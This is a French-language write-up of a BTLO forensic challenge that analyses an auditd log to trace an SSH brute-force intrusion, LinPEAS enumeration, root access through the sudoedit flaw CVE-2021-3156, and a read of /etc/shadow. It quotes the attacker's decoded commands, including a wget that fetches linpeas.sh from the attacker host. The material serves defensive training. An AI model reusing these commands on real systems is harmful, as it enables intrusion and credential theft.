# 🔐 BTLO — Paranoid Writeup

<p align="center">
  <img src="https://img.shields.io/badge/Challenge-Paranoid-red?style=for-the-badge">
  <img src="https://img.shields.io/badge/Type-Auditd%20Log%20Analysis-blue?style=for-the-badge">
  <img src="https://img.shields.io/badge/Difficulty-Hard-orange?style=for-the-badge">
</p>

---

## 📋 Scenario

> none

### 📂 Fichiers fournis

    paranoid.zip/
    └── Challenge Files/
        └── audit.log

> ⚠️ PS: celui la etait relativement compliquer  

---

## 🧠 Questions

---

### 🧾 Question 1) What account was compromised?

| Élément | Valeur |
|--------|--------|
| Réponse | **btlo** |
| Outil | `aureport` |

j'ai donc utiliser aureport

    sudo aureport -if audit.log -au

-if,--input <Input File name>	use this file as input  
-au,--auth			Authentication report  

ce qui ma donner de nombreuse reponse dont 

    89. 10/05/21 02:23:13 btlo 192.168.4.155 ssh /usr/sbin/sshd yes 467550
    90. 10/05/21 02:23:34 btlo ? /dev/pts/1 /usr/bin/sudo yes 468442

➡️ j'ai pue deduire dans la collone host : **btlo**

---

### 💣 Question 2) What attack type was used to gain initial access?

| Élément | Valeur |
|--------|--------|
| Réponse | **Brute Force** |

jai donc utiliser aureport 

    aureport -if audit.log  

ce qui ma donner de nombreuse reponse dont 

    Number of failed logins: 87
    Number of authentications: 3
    Number of failed authentications: 89

➡️ jai pue en deduire une attaque par **brutforce**

---

### 🌐 Question 3) What is the attacker's IP address?

| Élément | Valeur |
|--------|--------|
| Réponse | **192.168.4.155** |

j'ai utiliser le resultat tirer de la commande pour la question 1 

    sudo aureport -if audit.log -au

    89. 10/05/21 02:23:13 btlo 192.168.4.155 ssh /usr/sbin/sshd yes 467550

➡️ IP attaquant identifiée

---

### 🛠️ Question 4) What tool was used to perform system enumeration?

| Élément | Valeur |
|--------|--------|
| Réponse | **LinPEAS** |

jai reutiliser un commande utiliser par lattaquant 

    /usr/bin/wget pts1 192.168.4.155 1001 468454

jai donc repris levent ID : 

    grep -A5 "468454" audit.log

ce qui ma sortie le 

    proctitle=77676574002D4F002D00687474703A2F2F3139322E3136382E342E3135353A383030302F6C696E706561732E7368

je les decoder avec cette commande 

    echo "77676574002D4F002D00687474703A2F2F3139322E3136382E342E3135353A383030302F6C696E706561732E7368" | xxd -r -p

et il ma resortie la commande utiliser en clair 

    wget -O - http://192.168.4.155:8000/linpeas.sh

➡️ Tool utilisé : **LinPEAS**

---

### 🔓 Question 5) What is the name of the binary and pid used to gain root?

| Élément | Valeur |
|--------|--------|
| Réponse | **evil,829992** |

ses=49 etant la session de l'attaquant jai chercher les les événements sudo réussis avec leur PID 

    grep "ses=49" audit.log | grep "sudo" | grep "res=success"

➡️ ce qui ma donner le PID du shell root : **829992**

par la suite jai utiliser cette commande : 

    grep -B5 "481036" audit.log | grep -E "EXECVE|PROCTITLE|exe="

elle me permet de grep tout ce qui trouve avant levent 481036 et  

"EXECVE|PROCTITLE|exe=" :  

- EXECVE : arguments de la commande  
- PROCTITLE : commande complète  
- exe= : chemin du binaire  

jen ai tirer 

    proctitle=2E2F6576696C0030

et je les decoder avec cette commande 

    echo "2E2F6576696C0030" | xxd -r -p

ce qui ma donner 

    ./evil0

➡️ proctitle = **./evil0**

---

### 🧨 Question 6) What CVE was exploited to gain root access?

| Élément | Valeur |
|--------|--------|
| Réponse | **CVE-2021-3156** |

en faisant cette commande 

    grep -B5 "481036" audit.log | grep -E "EXECVE|PROCTITLE|exe="

jai pue observer 

    comm="sudoedit"

juste avant le shell root  

l'attaquant depuis tout a lheure essaye d'escalader les privilege  

ce qui ma mener a ce site  
https://www.sentinelone.com/vulnerability-database/cve-2021-3156/  

puis je suis allez voir les details sur ce site la  
https://nvd.nist.gov/vuln/detail/cve-2021-3156  

---

### 🧠 Question 7) What type of vulnerability is this?

| Élément | Valeur |
|--------|--------|
| Réponse | **Heap-Based Buffer Overflow** |

mentionner ici  
https://nvd.nist.gov/vuln/detail/cve-2021-3156  

---

### 📤 Question 8) What file was exfiltrated once root was gained?

| Élément | Valeur |
|--------|--------|
| Réponse | **/etc/shadow** |

    grep "481063" audit.log | grep "EXECVE" 

    type=EXECVE msg=audit(1633393670.675:481063): argc=2 a0="cat" a1="/etc/shadow"

➡️ fichier sensible exfiltré : **/etc/shadow**

---

## 🛠️ Outils utilisés

| Outil | Usage |
|------|------|
| aureport | Analyse auditd |
| grep | Filtrage |
| xxd | Décodage hex |
| wget | Téléchargement attaquant |
